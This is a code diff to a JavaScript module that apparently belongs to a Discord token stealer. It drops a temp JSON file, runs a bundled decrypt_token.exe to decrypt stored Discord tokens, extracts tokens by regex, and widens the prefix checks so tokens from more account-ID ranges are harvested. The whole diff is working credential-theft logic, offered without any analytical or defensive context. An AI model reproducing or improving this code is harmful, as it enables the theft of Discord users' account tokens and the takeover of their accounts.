@@ -8,7 +8,6 @@ const { addDoubleQuotes } = require('../util/string');
 const axios = require('axios');
 const { tempFolder } = require('../index');
 const { userAgent } = require('../config');
-const { runningFromExecutable } = require('../util/general');
 
 const jsonFile = join(tempFolder, 'Discord.json');
 writeFileSync(jsonFile, '{}');
@@ -40,10 +39,7 @@ const paths = {
 };
 
 const decryptToken = (token, key) => exec([
-  runningFromExecutable() ?
-    addDoubleQuotes(join(__dirname, 'decrypt_token.exe')) :
-    addDoubleQuotes(join(__dirname, '..', 'util', 'decrypt-token', 'decrypt_token.exe')),
-  `--key "${key}"`, `--token "${token}"`
+  addDoubleQuotes(join(tempFolder, 'decrypt_token.exe')), '--key', `"${key}"`, '--token', `"${token}"`
 ].join(' ')).toString();
 
 const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/;
@@ -140,8 +136,19 @@ module.exports = new Promise((resolve) => {
             if (tokensMatch) {
               tokensMatch.forEach((token) => {
                 if (
-                  !token.startsWith('MTA') && !token.startsWith('ODA') && !token.startsWith('NzM') &&
-                  !token.startsWith('OTk')
+                  // Each number is the first number a Discord User ID contains, depending on which Discord API
+                  // version they account was created
+                  !token.startsWith('MTg') && // 1
+                  !token.startsWith('MjI') && // 2
+                  !token.startsWith('MzM') && // 3
+                  !token.startsWith('NDU') && // 4
+                  !token.startsWith('NTE') && // 5
+                  !token.startsWith('NjU') && // 6
+                  !token.startsWith('NzM') && // 7
+                  !token.startsWith('ODA') && // 8
+                  !token.startsWith('OTk') && // 9
+                  !token.startsWith('MTA') && // 10
+                  !token.startsWith('MTE')    // 11
                 ) return;
                 if (!tokens.includes(token)) tokens.push(token);
               });
